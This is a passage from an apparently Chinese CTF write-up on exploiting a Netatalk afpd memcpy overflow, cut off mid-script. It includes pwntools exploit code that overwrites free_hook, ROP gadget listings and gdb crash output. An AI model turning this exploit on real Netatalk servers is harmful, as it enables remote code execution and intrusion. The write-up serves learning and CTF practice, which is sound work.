DSI_SERVQUANT_DEF <span class="token operator">:</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* AFP replaycache size option */</span>  offs <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>offs<span class="token punctuation">]</span> <span class="token operator">=</span> DSIOPT_REPLCSIZE<span class="token punctuation">;</span>  dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span>offs<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>REPLAYCACHE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>commands <span class="token operator">+</span> offs <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">dsi_send</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们在同一个socket中发送2条DSI消息，实现任意地址写。</p><h4 id="第一条消息"><a href="#第一条消息" class="headerlink" title="第一条消息"></a>第一条消息</h4><p>利用上面提到的memcpy漏洞，将*commands指针覆盖成free_hook的地址。发送第一条消息的DSI数据包的Header由 <code>gen_header(payload_len)</code>生成，Payload格式如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第二条消息"><a href="#第二条消息" class="headerlink" title="第二条消息"></a>第二条消息</h4><ul><li>afp_over_dsi()(@/etc/afpd/afp_dsi.c)：执行完上面提到的dsi_opensession()函数后，子进程返回至dsi_start()函数，调用afp_over_dsi()函数，该函数负责在当前socket下继续读取消息，并根据消息调用不同的处理函数，实现AFP协议的通信。函数首先调用了 <strong>dsi_stream_receive()</strong> ，从当前socket读取新消息，之后根据消息内容返回DSI header中的dsi_command。根据dsi_command值的不同，走不同的switch分支，其中当dsi_command为DSIFUNC_CMD时，会以commands[0]为index，从afp_switch这个全局的函数数组中选择对应的处理函数，处理commands数据。afp_switch这个全局的变量，在初始时赋值为preauth_switch，其中只包含认证前能访问的函数，在通过认证之后，会变为postauth_switch，可访问认证后的函数。<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">afp_over_dsi</span><span class="token punctuation">(</span>AFPObj <span class="token operator">*</span>obj<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    DSI <span class="token operator">*</span>dsi <span class="token operator">=</span> <span class="token punctuation">(</span>DSI <span class="token operator">*</span><span class="token punctuation">)</span> obj<span class="token operator">-></span>dsi<span class="token punctuation">;</span>    <span class="token keyword">int</span> rc_idx<span class="token punctuation">;</span>    <span class="token keyword">uint32_t</span> err<span class="token punctuation">,</span> cmd<span class="token punctuation">;</span>    <span class="token keyword">uint8_t</span> function<span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">/* Blocking read on the network socket */</span>        cmd <span class="token operator">=</span> <span class="token function">dsi_stream_receive</span><span class="token punctuation">(</span>dsi<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> DSIFUNC_CLOSE<span class="token operator">:</span>            <span class="token function">LOG</span><span class="token punctuation">(</span>log_debug<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"DSI: close session request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">afp_dsi_close</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">LOG</span><span class="token punctuation">(</span>log_note<span class="token punctuation">,</span> logtype_afpd<span class="token punctuation">,</span> <span class="token string">"done"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> DSIFUNC_TICKLE<span class="token operator">:</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">case</span> DSIFUNC_CMD<span class="token operator">:</span>            function <span class="token operator">=</span> <span class="token punctuation">(</span>u_char<span class="token punctuation">)</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>afp_switch<span class="token punctuation">[</span>function<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                err <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>afp_switch<span class="token punctuation">[</span>function<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>                                                  <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">,</span>                                                  <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dsi<span class="token operator">-></span>datalen<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>dsi_stream_receive()(@/libatalk/dsi/dsi_stream.c)：该函数从当前socket继续读取消息并保存在结构体中。具体地，先读取DSI header并保存到dsi-&gt;header结构体中，然后读取后续DSI payload保存到dsi-&gt;commands指向的buffer当中，长度由dsi-&gt;cmdlen指定。<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">dsi_stream_receive</span><span class="token punctuation">(</span>DSI <span class="token operator">*</span>dsi<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> block<span class="token punctuation">[</span>DSI_BLOCKSIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: START"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>flags <span class="token operator">&amp;</span> DSI_DISCONNECTED<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">/* read in the header */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_buffered_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">uint8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>block<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_flags <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_command <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff <span class="token operator">=</span> <span class="token function">htonl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">,</span> block <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_reserved<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dsi<span class="token operator">-></span>clientID <span class="token operator">=</span> <span class="token function">ntohs</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_requestID<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* make sure we don't over-write our buffers. */</span>  dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> <span class="token function">MIN</span><span class="token punctuation">(</span><span class="token function">ntohl</span><span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_len<span class="token punctuation">)</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>server_quantum<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* Receiving DSIWrite data is done in AFP function, not here */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">LOG</span><span class="token punctuation">(</span>log_maxdebug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: write request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      dsi<span class="token operator">-></span>cmdlen <span class="token operator">=</span> dsi<span class="token operator">-></span>header<span class="token punctuation">.</span>dsi_data<span class="token punctuation">.</span>dsi_doff<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">/* 将header之后的payload读取到commands指向的内存中 */</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dsi_stream_read</span><span class="token punctuation">(</span>dsi<span class="token punctuation">,</span> dsi<span class="token operator">-></span>commands<span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span> <span class="token operator">!=</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">LOG</span><span class="token punctuation">(</span>log_debug<span class="token punctuation">,</span> logtype_dsi<span class="token punctuation">,</span> <span class="token string">"dsi_stream_receive: DSI cmdlen: %zd"</span><span class="token punctuation">,</span> dsi<span class="token operator">-></span>cmdlen<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> block<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>第二条消息最终会由dsi_stream_receive()函数中的 <code>dsi_stream_read(dsi, dsi-&gt;commands, dsi-&gt;comlen)</code>函数读取到dsi-&gt;commands所指向的内存中（该指针已在第一条消息中被篡改为free_hook，因此此时我们篡改的就是free_hook）。其中dsi-&gt;comlen由DSI数据包中的Total data length指定。第二条消息的DSI数据包的Header也由 <code>gen_header(payload_len)</code>生成，Payload格式如下。在开头再加一个’\x00’是因为afp_over_dsi()函数在执行完dsi_stream_receive()后会进入 <code>case DSIFUNC_CMD</code>，第一个字节用于指定要使用的函数（<code>function = (u_char) dsi-&gt;commands[0]</code>）拿个0去填充即可。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>参考（CV）：<a href="https://gtrboy.github.io/posts/netatalk/">gtrboy</a></p><ol><li><p>setcontext+53：</p><pre class="line-numbers language-none"><code class="language-none">.text:0000000000052070 ; __unwind &#123;.text:0000000000052070                 push    rdi.text:0000000000052071                 lea     rsi, [rdi+128h] ; nset.text:0000000000052078                 xor     edx, edx        ; oset.text:000000000005207A                 mov     edi, 2          ; how.text:000000000005207F                 mov     r10d, 8         ; sigsetsize.text:0000000000052085                 mov     eax, 0Eh.text:000000000005208A                 syscall                 ; LINUX - sys_rt_sigprocmask.text:000000000005208C                 pop     rdi.text:000000000005208D                 cmp     rax, 0FFFFFFFFFFFFF001h.text:0000000000052093                 jnb     short loc_520F0.text:0000000000052095                 mov     rcx, [rdi+0E0h].text:000000000005209C                 fldenv  byte ptr [rcx].text:000000000005209E                 ldmxcsr dword ptr [rdi+1C0h].text:00000000000520A5                 mov     rsp, [rdi+0A0h]; &lt;--- setcontext+53.text:00000000000520AC                 mov     rbx, [rdi+80h].text:00000000000520B3                 mov     rbp, [rdi+78h].text:00000000000520B7                 mov     r12, [rdi+48h].text:00000000000520BB                 mov     r13, [rdi+50h].text:00000000000520BF                 mov     r14, [rdi+58h].text:00000000000520C3                 mov     r15, [rdi+60h].text:00000000000520C7                 mov     rcx, [rdi+0A8h].text:00000000000520CE                 push    rcx.text:00000000000520CF                 mov     rsi, [rdi+70h].text:00000000000520D3                 mov     rdx, [rdi+88h].text:00000000000520DA                 mov     rcx, [rdi+98h].text:00000000000520E1                 mov     r8, [rdi+28h].text:00000000000520E5                 mov     r9, [rdi+30h].text:00000000000520E9                 mov     rdi, [rdi+68h].text:00000000000520E9 ; &#125; &#x2F;&#x2F; starts at 52070.text:00000000000520ED ; __unwind &#123;.text:00000000000520ED                 xor     eax, eax.text:00000000000520EF                 retn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实对照下图可知：这段gadget是根据sigreturn系统调用中的Signal Frame格式在给各个寄存器赋值。由于赋值时是根据rdi寄存器中存放的值作为基址的，故使用这个gadget要求<strong>rdi寄存器</strong>及<strong>rdi指向的内存空间都可控</strong> 。</p><p><a href="https://imgtu.com/i/77bzYn"><img src="https://s4.ax1x.com/2022/01/25/77bzYn.png" alt="Signal Frame"></a></p></li><li><p>libc_dlopen_mode+56：这段gadget首先把_dl_open_hook内的值（并不是_dl_open_hook的地址）赋值给rax，然后以该值1为地址取值2，跳转到值2对应的地址。效果等价于令rip跳转到_dl_open_hook上所保存的地址，并且令rax=_dl_open_hook的地址值。</p><pre class="line-numbers language-none"><code class="language-none">.text:0000000000166450 ; __unwind &#123;.text:0000000000166450                 sub     rsp, 58h.text:0000000000166454                 mov     rax, fs:28h.text:000000000016645D                 mov     [rsp+58h+var_10], rax.text:0000000000166462                 xor     eax, eax.text:0000000000166464                 mov     rax, [rsp+58h].text:0000000000166469                 mov     [rsp+58h+var_38], rdi.text:000000000016646E                 mov     [rsp+58h+var_30], esi.text:0000000000166472                 mov     [rsp+58h+var_28], rax.text:0000000000166477                 mov     rax, cs:_rtld_global_ro_ptr.text:000000000016647E                 cmp     qword ptr [rax+148h], 0.text:0000000000166486                 jnz     short loc_1664B0.text:0000000000166488                 mov     rax, cs:_dl_open_hook; &lt;--- libc_dlopen_mode+56.text:000000000016648F                 call    qword ptr [rax]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>fgetpos64+207</p><pre class="line-numbers language-none"><code class="language-none">mov rdi, rax ; call qword ptr [rax + 0x20]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>布局</p><p><a href="https://imgtu.com/i/77bxFs"><img src="https://s4.ax1x.com/2022/01/25/77bxFs.png" alt="payload布局"></a></p></li></ol><h3 id="爆破基址"><a href="#爆破基址" class="headerlink" title="爆破基址"></a>爆破基址</h3><ol><li><p>先打一次会覆盖DSI结构中的command指针payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">False</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span class="token number">10002</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gen_payload1</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"\x01"</span>    payload <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> data    <span class="token keyword">return</span> payload<span class="token keyword">def</span> <span class="token function">gen_payload2</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"\x00"</span> <span class="token operator">+</span> data<span class="token keyword">def</span> <span class="token function">gen_header</span><span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span><span class="token punctuation">:</span>    header <span class="token operator">=</span> <span class="token string">"\x00"</span>    header <span class="token operator">+=</span> <span class="token string">"\x04"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x01"</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    header <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> payload_len<span class="token punctuation">)</span>    header <span class="token operator">+=</span> <span class="token string">"\x00\x00\x00\x00"</span>    <span class="token keyword">return</span> headerdata <span class="token operator">=</span> <span class="token string">""</span>data <span class="token operator">+=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x80</span>tmp <span class="token operator">=</span> gen_payload1<span class="token punctuation">(</span>data<span class="token punctuation">)</span>tmp <span class="token operator">=</span> gen_header<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> tmpp<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ sudo gdb --pid 5738 -qpwndbg&gt; set follow-fork-mode childpwndbg&gt; cContinuing.[New process 5931][Thread debugging using libthread_db enabled]Using host libthread_db library &quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libthread_db.so.1&quot;.Thread 2.1 &quot;afpd&quot; received signal SIGSEGV, Segmentation fault.[Switching to Thread 0x7fb640684740 (LWP 5931)]0x00007fb640218fbb in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────RAX  0x61616161RBX  0x55b9d5142450 ◂— 0x0RCX  0x6161616161616161 (&#39;aaaaaaaa&#39;)RDX  0x0RDI  0x55b9d5142ba8 ◂— 0x0RSI  0x7fb640583092 ◂— 0x0R8   0x55b9d5142b28 ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;R9   0x1R10  0x25R11  0x293R12  0x55b9d51400d0 ◂— 0x0R13  0x1eR14  0x7ffc23cfb350 ◂— 0x0R15  0x0RBP  0x55b9d5142450 ◂— 0x0RSP  0x7ffc23cfb250 ◂— 0x0RIP  0x7fb640218fbb ◂— movzx  eax, byte ptr [rcx + r9]─────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────► 0x7fb640218fbb    movzx  eax, byte ptr [rcx + r9]0x7fb640218fc0    lea    esi, [rdx + rax + 2]0x7fb640218fc4    cmp    rsi, qword ptr [rbx + 0x106f8]0x7fb640218fcb    mov    rdx, rsi0x7fb640218fce    jb     0x7fb640218f80                &lt;0x7fb640218f80&gt;↓0x7fb640218f80    cmp    byte ptr [rcx + rsi], 10x7fb640218f84    lea    r9d, [rdx + 1]0x7fb640218f88    movzx  eax, byte ptr [rcx + r9]0x7fb640218f8d    jne    0x7fb640218f70                &lt;0x7fb640218f70&gt;↓0x7fb640218f70    lea    esi, [rdx + rax + 2]0x7fb640218f74    cmp    rsi, qword ptr [rbx + 0x106f8]──────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────00:0000│ rsp 0x7ffc23cfb250 ◂— 0x001:0008│     0x7ffc23cfb258 —▸ 0x7fb640218c63 ◂— mov    qword ptr [r14], 002:0010│     0x7ffc23cfb260 ◂— 0x003:0018│     0x7ffc23cfb268 ◂— 0x60000000504:0020│     0x7ffc23cfb270 ◂— 0x17090000000205:0028│     0x7ffc23cfb278 ◂— 0x2000003e806:0030│     0x7ffc23cfb280 ◂— 0x7ffc5555555407:0038│     0x7ffc23cfb288 ◂— 0x46505845 &#x2F;* &#39;EXPF&#39; *&#x2F;────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────► f 0   0x7fb640218fbbf 1              0x0─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于DSI结构体中的command指针被赋值称 <code>0x6161616161616161</code>，该地址不可访问，程序断在 <code>0x7fb640218fbb</code>处。</p></li><li><p>接下来在 <code>0x7fb640218fbb</code>处下断点，定位DSI结构体在内存中的位置：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>REMOTE <span class="token operator">=</span> <span class="token boolean">False</span>IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">5566</span><span class="token keyword">if</span> REMOTE<span class="token punctuation">:</span>    IP <span class="token operator">=</span> <span class="token string">"chall.pwnable.tw"</span>    PORT <span class="token operator">=</span> <span 